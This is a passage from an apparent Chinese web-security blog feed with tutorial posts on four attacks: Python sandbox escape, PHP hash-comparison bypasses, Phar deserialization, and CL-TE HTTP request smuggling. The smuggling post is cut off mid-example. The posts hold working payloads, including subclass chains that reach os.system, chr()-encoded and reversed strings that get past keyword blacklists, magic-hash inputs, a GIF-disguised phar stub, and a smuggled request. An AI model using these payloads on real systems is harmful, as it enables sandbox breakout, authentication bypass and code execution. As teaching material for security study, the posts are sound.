&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历派生类并获取模块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(object.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路二 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 缓冲区 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断Python版本</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的标准库</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = __import__(module)  <span class="comment"># 导入模块</span></span><br><span class="line">        attrs = dir(m)          <span class="comment"># 获取属性与方法</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># 若存在危险模块</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路三 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险标准库的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路四 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型的特殊方法</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> dir(t):</span><br><span class="line">        <span class="comment"># 待比较类型</span></span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2特殊类型</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3特殊类型</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># 转义双引号</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            print(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.format(t=t, method=method))</span><br></pre></td></tr></table></figure><h4 id="思路一实例"><a href="#思路一实例" class="headerlink" title="思路一实例"></a>思路一实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">37</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">object.__subclasses__()[<span class="number">29</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="思路二实例"><a href="#思路二实例" class="headerlink" title="思路二实例"></a>思路二实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三实例"><a href="#思路三实例" class="headerlink" title="思路三实例"></a>思路三实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三特例"><a href="#思路三特例" class="headerlink" title="思路三特例"></a>思路三特例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路四实例"><a href="#思路四实例" class="headerlink" title="思路四实例"></a>思路四实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].append.__class__.__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>有些时候并不是删掉了某个危险模块，而是设置了一个输入关键字黑名单。如果是利用链中的字符串类型可以通过拼接、编码、倒序等多种方式绕过，如果是方法或属性可以通过同义替换绕过。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拼接</span></span><br><span class="line"><span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).sy&quot;</span>+<span class="string">&quot;stem(&#x27;who&quot;</span>+<span class="string">&quot;ami&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">eval(chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">105</span>)+chr(<span class="number">109</span>)+chr(<span class="number">112</span>)+chr(<span class="number">111</span>)+chr(<span class="number">114</span>)+chr(<span class="number">116</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">111</span>)+chr(<span class="number">115</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>)+chr(<span class="number">46</span>)+chr(<span class="number">115</span>)+chr(<span class="number">121</span>)+chr(<span class="number">115</span>)+chr(<span class="number">116</span>)+chr(<span class="number">101</span>)+chr(<span class="number">109</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">119</span>)+chr(<span class="number">104</span>)+chr(<span class="number">111</span>)+chr(<span class="number">97</span>)+chr(<span class="number">109</span>)+chr(<span class="number">105</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>))</span><br><span class="line"><span class="comment"># 倒序</span></span><br><span class="line"><span class="string">&quot;)&#x27;imaohw&#x27;(metsys.)&#x27;so&#x27;(__tropmi__&quot;</span>[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [].__class__.__bases__[0].__subclasses__()[37]</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="点号"><a href="#点号" class="headerlink" title="点号"></a>点号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__bases__&#x27;</span>),<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">0</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;bases&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;getitem&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(<span class="number">0</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p>只过滤引号的话可以利用一些通过序号取值的方法，但是如果点号不能用就得用getattr，而getattr又需要用到引号。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python 沙箱逃逸</a></p><p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">Python沙箱逃逸总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。&lt;/p&gt;
&lt;h2 id=&quot;导入模块&quot;&gt;&lt;a href=&quot;#导入模块&quot; class=&quot;headerlink&quot; title=&quot;导入模块&quot;&gt;&lt;/a&gt;导入模块&lt;/h2&gt;&lt;p&gt;Python导</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python" scheme="https://hosch3n.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PHP哈希函数漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/"/>
    <id>https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</id>
    <published>2020-08-24T03:39:24.000Z</published>
    <updated>2020-09-24T16:14:39.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0e"><a href="#0e" class="headerlink" title="0e"></a>0e</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&#x27;0e123&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e456&#x27;</span>;</span><br><span class="line">$a == $b;</span><br><span class="line">$a !== $b;</span><br><span class="line"></span><br><span class="line">md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>);</span><br><span class="line">md5(<span class="string">&#x27;s878926199a&#x27;</span>) == md5(<span class="string">&#x27;s155964671a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>);</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0e251288019&#x27;</span> == hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;0e251288019&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="number">0</span>];</span><br><span class="line">$b = [<span class="number">1</span>];</span><br><span class="line">$a != $b;</span><br><span class="line"></span><br><span class="line">md5($a) === md5($b);</span><br><span class="line"></span><br><span class="line">sha1($a) === sha1($b);</span><br><span class="line"></span><br><span class="line">hash(<span class="string">&#x27;md4&#x27;</span>, $a) == hash(<span class="string">&#x27;md4&#x27;</span>, $b);</span><br></pre></td></tr></table></figure><h2 id="‘or"><a href="#‘or" class="headerlink" title="‘or"></a>‘or</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stristr(md5(<span class="string">&#x27;ffifdyop&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br><span class="line">stristr(md5(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>浮点值运算存在精度问题，反序列化时会出现值不等但运算后哈希相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0e&quot;&gt;&lt;a href=&quot;#0e&quot; class=&quot;headerlink&quot; title=&quot;0e&quot;&gt;&lt;/a&gt;0e&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="hash" scheme="https://hosch3n.github.io/tags/hash/"/>
    
    <category term="md" scheme="https://hosch3n.github.io/tags/md/"/>
    
    <category term="sha" scheme="https://hosch3n.github.io/tags/sha/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-19T09:43:01.000Z</published>
    <updated>2020-08-19T15:43:19.828Z</updated>
    
    <content type="html"><![CDATA[<p>Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和<code>phar://</code>伪协议可以对phar文件进行读写等操作，如果 <code>phar.readonly</code> 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>根据<a href="https://www.php.net/manual/en/phar.fileformat.phar.php">官方文档</a>可知，Phar由 <code>stub</code>/<code>manifest</code>/<code>contents</code>/<code>signature</code> 四部分组成。</p><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>stub</code> 用于标识phar文件类型，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>（xxx为任意内容）。因为无需以特定标识开头，所以可以结合其它文件头进行伪装：<code>GIF89a&lt;?php __HALT_COMPILER();?&gt;</code>。</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>该结构存放了一些phar文件的大小长度等属性，包括序列化格式的元数据。</p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p><code>contents</code> 存放压缩后的实际文件内容。</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>顾名思义该结构用于文件校验，可以是常见的哈希值或密钥签名。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>因为 <code>manifest</code> 中的 <code>Meta-data</code> 以序列化格式存储，那么读取时必然有反序列化的过程，如果该部分用户可控（如上传phar文件并引用），则存在反序列化漏洞。</p><ul><li><a href="https://github.com/php/php-src/commit/0c238ede019f6ffbe7c996ec1695a747f4bca966">PHP8.0</a> 改为了不自动反序列化 <code>Meta-data</code>，除非调用了 <code>getMetadata()</code></li></ul><h3 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">&#x27;phar://test.phar&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($path)</span><br><span class="line">file_exists($path);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $code;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> Test();</span><br><span class="line">$object-&gt;code = <span class="string">&quot;echo &#x27;test&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的test.phar文件</span></span><br><span class="line">@unlink(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// 开始初始化过程</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 添加要打包压缩的文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入伪装过的头部标识</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入Meta-data并序列化</span></span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line"><span class="comment">// 生成phar文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和&lt;code&gt;phar://&lt;/code&gt;伪协议可以对phar文件进行读写等操作，如果 &lt;code&gt;phar.readonly&lt;/code&gt; 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="phar" scheme="https://hosch3n.github.io/tags/phar/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2020-08-16T14:29:15.000Z</published>
    <updated>2020-09-24T16:15:50.276Z</updated>
    
    <content type="html"><![CDATA[<p>聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）</p><p>一种是通过 <code>Content-Length</code> 请求头 的值界定请求体的长度，另一种是在<a href="https://zh.wikipedia.org/zh-hans/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输</a>时，通过 <code>Transfer-Encoding: chunked</code> 请求头与请求体最后一行的 <code>0\r\n\r\n</code> 来标识该请求的结束(不计入请求体长度)</p><p>按照<a href="https://tools.ietf.org/html/rfc2616#section-4.4">HTTP/1.1规范标准</a>，这两种请求头同时存在时应该忽略 <code>Content-Length</code> 而以分块传输为准，但是对于反代链中的多个服务器而言，可能有些并不支持分块传输请求头、有些对于标准规范的实现并未足够精细，在处理一些畸形请求头时会有非预期的效果。</p><blockquote><p>为了方便表述，接下来均将用于反向代理的服务器称为前端，隐藏在反代服务器之后用于提供具体业务的服务器称为后端。用 <code>CL-TE</code> 表示前端以 <code>Content-Length</code> 作为请求结束界定标准、<code>TE-CL</code> 表示前端以 <code>Transfer-Encoding</code> 作为请求结束界定标准。</p></blockquote><p>HTTP请求走私漏洞正是由于前后端服务器界定标准不一致导致的，利用HTTP请求走私使得 <code>一次攻击</code> 在前端服务器识别为 <code>一个请求</code> ，但传送到后端服务器时其误认为这是用了<a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">pipelining</a>，而将其识别为 <code>两个不同的请求</code>。</p><ul><li>更深入的细节原理，涉及到反代和后端对于消息的处理机制，这部分现在还不懂，以后懂了再单独分析</li></ul><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端读取 <code>CL</code> 值为50，会将这一整段视为一个请求转发至后端( <code>0</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>后端接收时以 <code>TE</code> 作为界定标准，将 <code>0\r\n\r\n</code> 视为一个请求的结束，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的包结构并不完整，所以后端认为这份数据还没有接收完毕，会继续将随后到来的请求拼接进去</p></li><li><p>注意 <code>CL</code> 取值为50时，是截止到最后一行的最后一个字母 <code>t</code> 的，也就是说 <code>t</code> 后面并不存在 <code>\r\n</code> 这对回车换行符，那么后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 